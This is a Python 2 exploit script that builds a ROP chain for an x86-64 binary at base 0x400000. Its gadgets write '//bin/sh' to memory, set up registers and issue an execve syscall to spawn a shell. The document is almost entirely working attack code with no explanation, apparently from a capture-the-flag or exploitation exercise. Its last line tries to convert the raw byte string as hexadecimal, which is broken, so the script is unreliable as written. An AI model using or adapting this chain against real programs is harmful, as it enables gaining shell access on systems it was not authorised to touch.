from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # 66d0f50fdd3176ebe4775c73437d57f8e48b9aa1a3a8fe8327689586cdeeed6b
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x00000000000119d8) # 0x00000000004119d8: pop r13; ret; 
rop += '//bin/sh'
rop += rebase_0(0x000000000000207b) # 0x000000000040207b: pop rbx; ret; 
rop += rebase_0(0x00000000000c00e0)
rop += rebase_0(0x0000000000084755) # 0x0000000000484755: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000119d8) # 0x00000000004119d8: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x000000000000207b) # 0x000000000040207b: pop rbx; ret; 
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x0000000000084755) # 0x0000000000484755: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000000191a) # 0x000000000040191a: pop rdi; ret; 
rop += rebase_0(0x00000000000c00e0)
rop += rebase_0(0x000000000000f4de) # 0x000000000040f4de: pop rsi; ret; 
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x000000000000181f) # 0x000000000040181f: pop rdx; ret; 
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x00000000000497d7) # 0x00000000004497d7: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x00000000000173d4) # 0x00000000004173d4: syscall; ret; 

print int(rop,16)
